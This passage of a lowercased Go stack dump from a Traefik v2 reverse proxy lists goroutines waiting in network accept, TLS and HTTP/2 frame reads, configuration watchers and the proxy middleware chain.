internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:87 +
internal/poll.(*polldesc).waitread(...) /usr/local/go/src/internal/poll/fd_poll_runtime.go:92
internal/poll.(*fd).accept( , , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:384 +
net.(*netfd).accept( , , , ) /usr/local/go/src/net/fd_unix.go:238 +
net.(*tcplistener).accept( , , , ) /usr/local/go/src/net/tcpsock_posix.go:139 +
net.(*tcplistener).accepttcp( , , , ) /usr/local/go/src/net/tcpsock.go:248 +
github.com/containous/traefik/v2/pkg/server.tcpkeepalivelistener.accept( , , , , ) /go/src/github.com/containous/traefik/pkg/server/server_entrypoint_tcp.go:241 +
github.com/containous/traefik/v2/pkg/server.(*tcpentrypoint).starttcp( , , ) /go/src/github.com/containous/traefik/pkg/server/server_entrypoint_tcp.go:135 +
created by github.com/containous/traefik/v2/pkg/server.(*server).starttcpservers /go/src/github.com/containous/traefik/pkg/server/server.go:258 + goroutine 13 [select, 27 minutes]:
github.com/containous/traefik/v2/pkg/server.(*server).listenproviders( , ) /go/src/github.com/containous/traefik/pkg/server/server.go:264 +
github.com/containous/traefik/v2/pkg/server.(*server).start.func2( ) /go/src/github.com/containous/traefik/pkg/server/server.go:180 +
github.com/containous/traefik/v2/pkg/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/pkg/safe/routine.go:90 +
github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:153 +
created by github.com/containous/traefik/v2/pkg/safe.gowithrecover /go/src/github.com/containous/traefik/pkg/safe/routine.go:147 + goroutine 14 [select, 27 minutes]:
github.com/containous/traefik/v2/pkg/server.(*server).listenconfigurations( , ) /go/src/github.com/containous/traefik/pkg/server/server_configuration.go:242 +
github.com/containous/traefik/v2/pkg/server.(*server).start.func3( ) /go/src/github.com/containous/traefik/pkg/server/server.go:183 +
github.com/containous/traefik/v2/pkg/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/pkg/safe/routine.go:90 +
github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:153 +
created by github.com/containous/traefik/v2/pkg/safe.gowithrecover /go/src/github.com/containous/traefik/pkg/safe/routine.go:147 + goroutine 91 [select, 27 minutes]:
github.com/containous/traefik/v2/pkg/server.(*server).throttleproviderconfigreload( , , , , ) /go/src/github.com/containous/traefik/pkg/server/server_configuration.go:277 +
github.com/containous/traefik/v2/pkg/server.(*server).preloadconfiguration.func1( ) /go/src/github.com/containous/traefik/pkg/server/server_configuration.go:229 +
github.com/containous/traefik/v2/pkg/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/pkg/safe/routine.go:90 +
github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:153 +
created by github.com/containous/traefik/v2/pkg/safe.gowithrecover /go/src/github.com/containous/traefik/pkg/safe/routine.go:147 + goroutine 16 [select, 27 minutes]:
github.com/containous/traefik/v2/pkg/server.(*server).listensignals( , ) /go/src/github.com/containous/traefik/pkg/server/server_signals.go:18 +
github.com/containous/traefik/v2/pkg/server.(*server).start.func4( ) /go/src/github.com/containous/traefik/pkg/server/server.go:187 +
github.com/containous/traefik/v2/pkg/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/pkg/safe/routine.go:90 +
github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:153 +
created by github.com/containous/traefik/v2/pkg/safe.gowithrecover /go/src/github.com/containous/traefik/pkg/safe/routine.go:147 + goroutine 89 [syscall, 27 minutes]:
syscall.syscall6( , , , , , , , , , ) /usr/local/go/src/syscall/asm_linux_amd64.s:44 +
golang.org/x/sys/unix.epollwait( , , , , , , , ) /go/pkg/mod/golang.org/x/sys@v0.0.0-20190813064441-fde4db37ae7a/unix/zsyscall_linux_amd64.go:1760 +
gopkg.in/fsnotify%2ev1.(*fdpoller).wait( , , , ) /go/pkg/mod/gopkg.in/fsnotify.v1@v1.4.7/inotify_poller.go:86 +
gopkg.in/fsnotify%2ev1.(*watcher).readevents( ) /go/pkg/mod/gopkg.in/fsnotify.v1@v1.4.7/inotify.go:192 +
created by gopkg.in/fsnotify%2ev1.newwatcher /go/pkg/mod/gopkg.in/fsnotify.v1@v1.4.7/inotify.go:59 + goroutine 90 [select, 27 minutes]:
github.com/containous/traefik/v2/pkg/provider/file.(*provider).addwatcher.func1( ) /go/src/github.com/containous/traefik/pkg/provider/file/file.go:109 +
github.com/containous/traefik/v2/pkg/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/pkg/safe/routine.go:90 +
github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:153 +
created by github.com/containous/traefik/v2/pkg/safe.gowithrecover /go/src/github.com/containous/traefik/pkg/safe/routine.go:147 + goroutine 92 [select, 27 minutes]:
github.com/eapache/channels.(*ringchannel).ringbuffer( ) /go/pkg/mod/github.com/eapache/channels@v1.1.0/ring_channel.go:87 +
created by github.com/eapache/channels.newringchannel /go/pkg/mod/github.com/eapache/channels@v1.1.0/ring_channel.go:32 + goroutine 93 [select, 27 minutes]:
github.com/containous/traefik/v2/pkg/server.(*server).throttleproviderconfigreload.func1( ) /go/src/github.com/containous/traefik/pkg/server/server_configuration.go:264 +
github.com/containous/traefik/v2/pkg/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/pkg/safe/routine.go:90 +
github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:153 +
created by github.com/containous/traefik/v2/pkg/safe.gowithrecover /go/src/github.com/containous/traefik/pkg/safe/routine.go:147 + goroutine 145 [select, 7 minutes]:
github.com/patrickmn/go-cache.(*janitor).run( , ) /go/pkg/mod/github.com/patrickmn/go-cache@v2.1.0+incompatible/cache.go:1079 +
created by github.com/patrickmn/go-cache.runjanitor /go/pkg/mod/github.com/patrickmn/go-cache@v2.1.0+incompatible/cache.go:1099 + goroutine 114 [io wait, 1 minutes]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:184 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:87 +
internal/poll.(*polldesc).waitread(...) /usr/local/go/src/internal/poll/fd_poll_runtime.go:92
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:169 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:184 +
github.com/containous/traefik/v2/pkg/tcp.(*conn).read( , , , , , , ) /go/src/github.com/containous/traefik/pkg/tcp/router.go:173 +
crypto/tls.(*atleastreader).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:780 +
bytes.(*buffer).readfrom( , , , , , ) /usr/local/go/src/bytes/buffer.go:204 +
crypto/tls.(*conn).readfromuntil( , , , , , ) /usr/local/go/src/crypto/tls/conn.go:802 +
crypto/tls.(*conn).readrecordorccs( , , , ) /usr/local/go/src/crypto/tls/conn.go:609 +
crypto/tls.(*conn).readrecord(...) /usr/local/go/src/crypto/tls/conn.go:577
crypto/tls.(*conn).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1255 +
io.readatleast( , , , , , , , , ) /usr/local/go/src/io/io.go:310 +
io.readfull(...) /usr/local/go/src/io/io.go:329
net/http.http2readframeheader( , , , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1477 +
net/http.(*http2framer).readframe( , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1735 +
net/http.(*http2serverconn).readframes( ) /usr/local/go/src/net/http/h2_bundle.go:4310 +
created by net/http.(*http2serverconn).serve /usr/local/go/src/net/http/h2_bundle.go:4415 + goroutine 280 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:184 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:87 +
internal/poll.(*polldesc).waitread(...) /usr/local/go/src/internal/poll/fd_poll_runtime.go:92
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:169 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:184 +
bufio.(*reader).read( , , , , , , ) /usr/local/go/src/bufio/bufio.go:226 +
io.readatleast( , , , , , , , , ) /usr/local/go/src/io/io.go:310 +
io.readfull(...) /usr/local/go/src/io/io.go:329
golang.org/x/net/http2.readframeheader( , , , , , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/frame.go:237 +
golang.org/x/net/http2.(*framer).readframe( , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/frame.go:492 +
golang.org/x/net/http2.(*clientconnreadloop).run( , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1710 +
golang.org/x/net/http2.(*clientconn).readloop( ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1638 +
created by golang.org/x/net/http2.(*transport).newclientconn /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:673 + goroutine 125 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:184 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:87 +
internal/poll.(*polldesc).waitread(...) /usr/local/go/src/internal/poll/fd_poll_runtime.go:92
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:169 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:184 +
bufio.(*reader).read( , , , , , , ) /usr/local/go/src/bufio/bufio.go:226 +
io.readatleast( , , , , , , , , ) /usr/local/go/src/io/io.go:310 +
io.readfull(...) /usr/local/go/src/io/io.go:329
golang.org/x/net/http2.readframeheader( , , , , , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/frame.go:237 +
golang.org/x/net/http2.(*framer).readframe( , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/frame.go:492 +
golang.org/x/net/http2.(*clientconnreadloop).run( , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1710 +
golang.org/x/net/http2.(*clientconn).readloop( ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1638 +
created by golang.org/x/net/http2.(*transport).newclientconn /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:673 + goroutine 176 [io wait, 24 minutes]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:184 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:87 +
internal/poll.(*polldesc).waitread(...) /usr/local/go/src/internal/poll/fd_poll_runtime.go:92
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:169 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:184 +
github.com/containous/traefik/v2/pkg/tcp.(*conn).read( , , , , , , ) /go/src/github.com/containous/traefik/pkg/tcp/router.go:173 +
crypto/tls.(*atleastreader).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:780 +
bytes.(*buffer).readfrom( , , , , , ) /usr/local/go/src/bytes/buffer.go:204 +
crypto/tls.(*conn).readfromuntil( , , , , , ) /usr/local/go/src/crypto/tls/conn.go:802 +
crypto/tls.(*conn).readrecordorccs( , , , ) /usr/local/go/src/crypto/tls/conn.go:609 +
crypto/tls.(*conn).readrecord(...) /usr/local/go/src/crypto/tls/conn.go:577
crypto/tls.(*conn).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1255 +
io.readatleast( , , , , , , , , ) /usr/local/go/src/io/io.go:310 +
io.readfull(...) /usr/local/go/src/io/io.go:329
net/http.http2readframeheader( , , , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1477 +
net/http.(*http2framer).readframe( , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1735 +
net/http.(*http2serverconn).readframes( ) /usr/local/go/src/net/http/h2_bundle.go:4310 +
created by net/http.(*http2serverconn).serve /usr/local/go/src/net/http/h2_bundle.go:4415 + goroutine 177 [select, 24 minutes]:
net/http.(*http2serverconn).serve( ) /usr/local/go/src/net/http/h2_bundle.go:4423 +
net/http.(*http2server).serveconn( , , , ) /usr/local/go/src/net/http/h2_bundle.go:4031 +
net/http.http2configureserver.func1( , , , ) /usr/local/go/src/net/http/h2_bundle.go:3857 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1800 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2927 + goroutine 43 [select, 24 minutes]:
net/http.(*http2serverconn).serve( ) /usr/local/go/src/net/http/h2_bundle.go:4423 +
net/http.(*http2server).serveconn( , , , ) /usr/local/go/src/net/http/h2_bundle.go:4031 +
net/http.http2configureserver.func1( , , , ) /usr/local/go/src/net/http/h2_bundle.go:3857 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1800 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2927 + goroutine 44 [io wait, 24 minutes]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:184 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:87 +
internal/poll.(*polldesc).waitread(...) /usr/local/go/src/internal/poll/fd_poll_runtime.go:92
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:169 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:184 +
github.com/containous/traefik/v2/pkg/tcp.(*conn).read( , , , , , , ) /go/src/github.com/containous/traefik/pkg/tcp/router.go:173 +
crypto/tls.(*atleastreader).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:780 +
bytes.(*buffer).readfrom( , , , , , ) /usr/local/go/src/bytes/buffer.go:204 +
crypto/tls.(*conn).readfromuntil( , , , , , ) /usr/local/go/src/crypto/tls/conn.go:802 +
crypto/tls.(*conn).readrecordorccs( , , , ) /usr/local/go/src/crypto/tls/conn.go:609 +
crypto/tls.(*conn).readrecord(...) /usr/local/go/src/crypto/tls/conn.go:577
crypto/tls.(*conn).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1255 +
io.readatleast( , , , , , , , , ) /usr/local/go/src/io/io.go:310 +
io.readfull(...) /usr/local/go/src/io/io.go:329
net/http.http2readframeheader( , , , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1477 +
net/http.(*http2framer).readframe( , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1735 +
net/http.(*http2serverconn).readframes( ) /usr/local/go/src/net/http/h2_bundle.go:4310 +
created by net/http.(*http2serverconn).serve /usr/local/go/src/net/http/h2_bundle.go:4415 + goroutine 107 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:184 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:87 +
internal/poll.(*polldesc).waitread(...) /usr/local/go/src/internal/poll/fd_poll_runtime.go:92
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:169 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:184 +
github.com/containous/traefik/v2/pkg/tcp.(*conn).read( , , , , , , ) /go/src/github.com/containous/traefik/pkg/tcp/router.go:173 +
crypto/tls.(*atleastreader).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:780 +
bytes.(*buffer).readfrom( , , , , , ) /usr/local/go/src/bytes/buffer.go:204 +
crypto/tls.(*conn).readfromuntil( , , , , , ) /usr/local/go/src/crypto/tls/conn.go:802 +
crypto/tls.(*conn).readrecordorccs( , , , ) /usr/local/go/src/crypto/tls/conn.go:609 +
crypto/tls.(*conn).readrecord(...) /usr/local/go/src/crypto/tls/conn.go:577
crypto/tls.(*conn).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1255 +
io.readatleast( , , , , , , , , ) /usr/local/go/src/io/io.go:310 +
io.readfull(...) /usr/local/go/src/io/io.go:329
net/http.http2readframeheader( , , , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1477 +
net/http.(*http2framer).readframe( , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1735 +
net/http.(*http2serverconn).readframes( ) /usr/local/go/src/net/http/h2_bundle.go:4310 +
created by net/http.(*http2serverconn).serve /usr/local/go/src/net/http/h2_bundle.go:4415 + goroutine 239 [select]:
net/http.(*http2serverconn).serve( ) /usr/local/go/src/net/http/h2_bundle.go:4423 +
net/http.(*http2server).serveconn( , , , ) /usr/local/go/src/net/http/h2_bundle.go:4031 +
net/http.http2configureserver.func1( , , , ) /usr/local/go/src/net/http/h2_bundle.go:3857 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1800 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2927 + goroutine 315 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:184 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:87 +
internal/poll.(*polldesc).waitread(...) /usr/local/go/src/internal/poll/fd_poll_runtime.go:92
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:169 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:184 +
bufio.(*reader).read( , , , , , , ) /usr/local/go/src/bufio/bufio.go:226 +
io.readatleast( , , , , , , , , ) /usr/local/go/src/io/io.go:310 +
io.readfull(...) /usr/local/go/src/io/io.go:329
golang.org/x/net/http2.readframeheader( , , , , , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/frame.go:237 +
golang.org/x/net/http2.(*framer).readframe( , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/frame.go:492 +
golang.org/x/net/http2.(*clientconnreadloop).run( , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1710 +
golang.org/x/net/http2.(*clientconn).readloop( ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1638 +
created by golang.org/x/net/http2.(*transport).newclientconn /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:673 + goroutine 533 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:184 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:87 +
internal/poll.(*polldesc).waitread(...) /usr/local/go/src/internal/poll/fd_poll_runtime.go:92
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:169 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:184 +
bufio.(*reader).read( , , , , , , ) /usr/local/go/src/bufio/bufio.go:226 +
io.readatleast( , , , , , , , , ) /usr/local/go/src/io/io.go:310 +
io.readfull(...) /usr/local/go/src/io/io.go:329
golang.org/x/net/http2.readframeheader( , , , , , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/frame.go:237 +
golang.org/x/net/http2.(*framer).readframe( , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/frame.go:492 +
golang.org/x/net/http2.(*clientconnreadloop).run( , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1710 +
golang.org/x/net/http2.(*clientconn).readloop( ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1638 +
created by golang.org/x/net/http2.(*transport).newclientconn /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:673 + goroutine 894 [select]:
net/http.(*http2serverconn).serve( ) /usr/local/go/src/net/http/h2_bundle.go:4423 +
net/http.(*http2server).serveconn( , , , ) /usr/local/go/src/net/http/h2_bundle.go:4031 +
net/http.http2configureserver.func1( , , , ) /usr/local/go/src/net/http/h2_bundle.go:3857 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1800 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2927 + goroutine 913 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:184 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:87 +
internal/poll.(*polldesc).waitread(...) /usr/local/go/src/internal/poll/fd_poll_runtime.go:92
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:169 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:184 +
github.com/containous/traefik/v2/pkg/tcp.(*conn).read( , , , , , , ) /go/src/github.com/containous/traefik/pkg/tcp/router.go:173 +
crypto/tls.(*atleastreader).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:780 +
bytes.(*buffer).readfrom( , , , , , ) /usr/local/go/src/bytes/buffer.go:204 +
crypto/tls.(*conn).readfromuntil( , , , , , ) /usr/local/go/src/crypto/tls/conn.go:802 +
crypto/tls.(*conn).readrecordorccs( , , , ) /usr/local/go/src/crypto/tls/conn.go:609 +
crypto/tls.(*conn).readrecord(...) /usr/local/go/src/crypto/tls/conn.go:577
crypto/tls.(*conn).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1255 +
io.readatleast( , , , , , , , , ) /usr/local/go/src/io/io.go:310 +
io.readfull(...) /usr/local/go/src/io/io.go:329
net/http.http2readframeheader( , , , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1477 +
net/http.(*http2framer).readframe( , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1735 +
net/http.(*http2serverconn).readframes( ) /usr/local/go/src/net/http/h2_bundle.go:4310 +
created by net/http.(*http2serverconn).serve /usr/local/go/src/net/http/h2_bundle.go:4415 + goroutine 4843 [select]:
net/http.(*http2serverconn).readframes( ) /usr/local/go/src/net/http/h2_bundle.go:4311 +
created by net/http.(*http2serverconn).serve /usr/local/go/src/net/http/h2_bundle.go:4415 + goroutine 658876 [select]:
golang.org/x/net/http2.(*clientconn).roundtrip( , , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1084 +
golang.org/x/net/http2.(*transport).roundtripopt( , , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:447 +
golang.org/x/net/http2.(*transport).roundtrip(...) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:408
github.com/containous/traefik/v2/pkg/server.(*h2ctransportwrapper).roundtrip( , , , , ) /go/src/github.com/containous/traefik/pkg/server/roundtripper.go:23 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:485 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/roundtrip.go:17 +
net/http/httputil.(*reverseproxy).servehttp( , , , ) /usr/local/go/src/net/http/httputil/reverseproxy.go:249 +
github.com/containous/traefik/v2/pkg/middlewares/pipelining.(*pipelining).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/pipelining/pipelining.go:34 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.addservicefields( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:47 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*fieldhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:36 +
github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , ) /go/pkg/mod/github.com/vulcand/oxy@v1.0.0/roundrobin/rr.go:147 +
github.com/containous/traefik/v2/pkg/middlewares/emptybackendhandler.(*emptybackend).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/emptybackendhandler/empty_backend_handler.go:31 +
github.com/containous/traefik/v2/pkg/middlewares/tracing.(*forwardermiddleware).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/tracing/forwarder.go:38 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*fieldhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:38 +
github.com/gorilla/mux.(*router).servehttp( , , , ) /go/pkg/mod/github.com/containous/mux@v0.0.0-20181024131434-c33f32e26898/mux.go:133 +
github.com/containous/traefik/v2/pkg/middlewares/recovery.(*recovery).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/recovery/recovery.go:33 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.addoriginfields( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:55 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*fieldhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:36 +
github.com/containous/traefik/v2/pkg/middlewares/requestdecorator.(*requestdecorator).servehttp( , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/requestdecorator/request_decorator.go:47 +
github.com/containous/traefik/v2/pkg/middlewares/requestdecorator.wraphandler.func1.1( , , ) /go/src/github.com/containous/traefik/pkg/middlewares/requestdecorator/request_decorator.go:84 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2007 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*handler).servehttp( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:202 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.wraphandler.func1.1( , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:69 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2007 +
github.com/containous/traefik/v2/pkg/middlewares.(*httphandlerswitcher).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/handler_switcher.go:23 +
github.com/containous/traefik/v2/pkg/middlewares/forwardedheaders.(*xforwarded).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/forwardedheaders/forwarded_header.go:174 +
net/http.serverhandler.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2802 +
net/http.initnpnrequest.servehttp( , , , , , , ) /usr/local/go/src/net/http/server.go:3365 +
net/http.(*http2serverconn).runhandler( , , , ) /usr/local/go/src/net/http/h2_bundle.go:5713 +
created by net/http.(*http2serverconn).processheaders /usr/local/go/src/net/http/h2_bundle.go:5447 + goroutine 4879 [runnable]:
net/http.http2gate.done(...) /usr/local/go/src/net/http/h2_bundle.go:3292
net/http.(*http2serverconn).serve( ) /usr/local/go/src/net/http/h2_bundle.go:4436 +
net/http.(*http2server).serveconn( , , , ) /usr/local/go/src/net/http/h2_bundle.go:4031 +
net/http.http2configureserver.func1( , , , ) /usr/local/go/src/net/http/h2_bundle.go:3857 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1800 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2927 + goroutine 659810 [runnable]:
golang.org/x/net/http2.(*clientconn).roundtrip( , , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1084 +
golang.org/x/net/http2.(*transport).roundtripopt( , , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:447 +
golang.org/x/net/http2.(*transport).roundtrip(...) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:408
github.com/containous/traefik/v2/pkg/server.(*h2ctransportwrapper).roundtrip( , , , , ) /go/src/github.com/containous/traefik/pkg/server/roundtripper.go:23 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:485 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/roundtrip.go:17 +
net/http/httputil.(*reverseproxy).servehttp( , , , ) /usr/local/go/src/net/http/httputil/reverseproxy.go:249 +
github.com/containous/traefik/v2/pkg/middlewares/pipelining.(*pipelining).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/pipelining/pipelining.go:34 +
